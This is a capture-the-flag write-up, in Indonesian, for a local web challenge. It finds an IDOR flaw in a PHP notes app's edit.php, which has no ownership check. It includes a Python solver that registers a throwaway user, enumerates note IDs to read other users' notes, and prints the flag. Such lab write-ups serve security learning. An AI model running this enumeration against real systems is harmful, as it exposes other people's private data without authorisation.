# WriteUp: Akses data lagi

## Overview

* **Judul:** Akses data lagi
* **Kategori:** Access Control
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu akses data orang lain?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1340`

## Informasi Attachment

File yang diberikan adalah `akses-data2.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akses data lagi]
└─$ tree
.
├── akses-data2.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`akses-data2.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/oto2:latest
    ports:
      - "1340:80"
    environment:
      - PWN=${PWN:-defaultuser}
    volumes:
      - app_data:/var/www/html/data
volumes:
  app_data:

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose dengan port yang disesuaikan ke **1340** dan penghapusan limit resource untuk kompatibilitas WSL.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akses data lagi]
└─$ PWN=WanZKey docker compose -f akses-data2.yml up -d --build
[+] up 14/14
 ✔ Container aksesdatalagi-web-1 Created

```

### 2. Source Code Analysis (White Box)

Melakukan perbandingan antara file `infos.php` (menampilkan detail note) dan `edit.php` (mengedit note).

**Analisis `infos.php` (Secure):**
Developer telah menambal celah IDOR di endpoint ini dengan menambahkan validasi kepemilikan.

```php
// SECURITY CHECK: Ensure user owns the note
if ($note['user_id'] != $_SESSION['user_id']) {
    session_destroy();
    header('Location: /index.php');
    exit;
}

```

**Analisis `edit.php` (Vulnerable):**
Developer **LUPA** menambahkan validasi serupa pada endpoint edit. Aplikasi mengambil data note berdasarkan ID dan langsung menampilkannya ke dalam form tanpa mengecek apakah user yang login adalah pemilik note tersebut.

```php
// ...
$stmt = $db->prepare('SELECT * FROM notes WHERE id = ?');
$stmt->execute([$note_id]);
$note = $stmt->fetch(PDO::FETCH_ASSOC);

// VULNERABILITY: Tidak ada pengecekan $note['user_id'] == $_SESSION['user_id']
// ...

```

### 3. Database Inspection

Memeriksa file database SQLite untuk memastikan keberadaan Flag.

```bash
docker exec aksesdatalagi-web-1 cat /var/www/html/data/database.db

```

Ditemukan entri note berisi flag: `System Configurationpwn{...}`.

### 4. Exploitation

Mengeksploitasi celah IDOR pada `edit.php`:

1. Melakukan registrasi user baru untuk mendapatkan sesi valid.
2. Melakukan brute force ID pada endpoint `/edit.php?id=<ID>`.
3. Mengambil konten flag yang "bocor" melalui field `<textarea>`.

## Script Solver

Script berikut otomatis melakukan registrasi dan enumerasi ID pada endpoint `edit.php`.

**File:** `exploit.py`

```python
import requests
import random
import string
import re

# Update PORT sesuai challenge (1340)
URL = "http://localhost:1340"

def exploit():
    s = requests.Session()
    
    # 1. Register User Random (Biar dapet Session)
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Registering user: {username}")
    
    try:
        s.post(f"{URL}/auth.php", data={
            'action': 'register',
            'username': username,
            'password': password,
            'email': f'{username}@pwn.com'
        })
        
        # 2. Login
        print("[*] Logging in...")
        s.post(f"{URL}/auth.php", data={
            'action': 'login',
            'username': username,
            'password': password
        })

        # 3. IDOR Brute Force pada EDIT.PHP
        print("[*] Starting IDOR on edit.php (ID 1-10)...")
        
        for i in range(1, 11):
            # Target endpoint: /edit.php
            r = s.get(f"{URL}/edit.php?id={i}", allow_redirects=False)
            
            if r.status_code == 200:
                print(f"\n[+] ACCESSED EDIT PAGE ID: {i}")
                
                # Cari isi content di dalam <textarea>
                content_match = re.search(r'<textarea.*?>(.*?)</textarea>', r.text, re.DOTALL)
                
                if content_match:
                    content = content_match.group(1).strip()
                    print(f"    Content: {content}")
                    
                    if "pwn{" in content:
                        print(f"\n[!!!] FLAG FOUND: {content}\n")
                        return
                else:
                    print("    (Content empty or regex failed)")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akses data lagi]
└─$ python3 exploit.py
[*] Registering user: vdjzxztm
[*] Logging in...
[*] Starting IDOR on edit.php (ID 1-10)...

[+] ACCESSED EDIT PAGE ID: 1
    Content: This is your first note. You can create, edit, and manage your tasks here.

[+] ACCESSED EDIT PAGE ID: 2
    Content: Review the project requirements and create a timeline for deliverables.

[+] ACCESSED EDIT PAGE ID: 3
    Content: pwn{935254ae739529d41e774b3ea1f28684}

[!!!] FLAG FOUND: pwn{935254ae739529d41e774b3ea1f28684}

```

## Flag

```
pwn{935254ae739529d41e774b3ea1f28684}

```
